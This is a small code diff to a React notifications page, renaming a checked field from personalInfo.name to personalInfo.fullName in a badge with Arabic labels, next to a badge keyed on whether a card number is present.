@@ -1597,7 +1597,7 @@ export default function NotificationsPage() {
                                     className="rounded-md cursor-pointer"
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
-                                    {notification.personalInfo?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                    {notification.personalInfo?.fullName ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
